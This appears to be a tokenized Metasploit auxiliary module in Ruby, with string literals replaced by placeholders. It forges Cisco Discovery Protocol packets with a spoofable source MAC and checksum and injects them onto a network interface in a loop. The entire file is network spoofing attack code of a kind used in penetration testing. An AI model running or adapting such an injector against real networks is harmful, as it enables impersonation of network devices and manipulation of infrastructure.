require <str> class Metasploit3 < Msf :: Auxiliary include Msf :: Exploit :: Capture def initialize super ( <str> = > <str> , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] ] , <str> = > [ [ <str> , { <str> = > <str> } ] ] , <str> = > <str> ) register_options ( [ OptString . new ( <str> , [ false , <str> ] ) , OptString . new ( <str> , [ false , <str> ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) , OptBool . new ( <str> , [ true , <str> , true ] ) ] , self . class ) deregister_options ( <str> , <str> , <str> , <str> , <str> ) end def setup check_pcaprub_loaded unless smac fail ArgumentError , <str> interface <str> end open_pcap close_pcap end def interface @interface || = datastore [ <str> ] || Pcap . lookupdev end def smac @smac || = datastore [ <str> ] || get_mac ( interface ) end def run begin open_pcap @run = true cdp_packet = build_cdp print_status ( <str> interface <str> ) while @run capture . inject ( cdp_packet ) Rex . sleep ( <int> ) end ensure close_pcap end end def build_cdp cdp = <str> cdp << <str> cdp << <str> cdp << <str> cdp << tlv ( <int> , datastore [ <str> ] ) cdp << tlv ( <int> , datastore [ <str> ] ) cdp << tlv ( <int> , <str> ) cdp << tlv ( <int> , datastore [ <str> ] ) cdp << tlv ( <int> , datastore [ <str> ] ) cdp << tlv ( <int> , datastore [ <str> ] ) if datastore [ <str> ] cdp << tlv ( <hex> , [ <int> + rand ( <int> ) ] . pack ( <str> ) ) cdp << tlv ( <hex> , datastore [ <str> ] ? <str> : <str> ) cdp << <str> cdp [ <int> , <int> ] = [ compute_cdp_checksum ( cdp ) ] . pack ( <str> ) PacketFu :: EthHeader . mac2str ( <str> ) + PacketFu :: EthHeader . mac2str ( smac ) + [ cdp . length + <int> ] . pack ( <str> ) + <str> + cdp end def tlv ( t , v ) [ t , v . length + <int> ] . pack ( <str> ) + v end def compute_cdp_checksum ( cdp ) num_shorts = cdp . length / <int> checksum = <int> remaining = cdp . length cdp . unpack ( <str> num_shorts <str> ) . each do | short | checksum += short remaining -= <int> end checksum += cdp [ cdp . length - <int> ] . getbyte ( <int> ) << <int> if remaining == <int> checksum = ( checksum >> <int> ) + ( checksum & <hex> ) checksum = ~ ( ( checksum >> <int> ) + checksum ) & <hex> ( [ checksum ] . pack ( <str> ) ) . unpack ( <str> ) [ <int> ] end end 
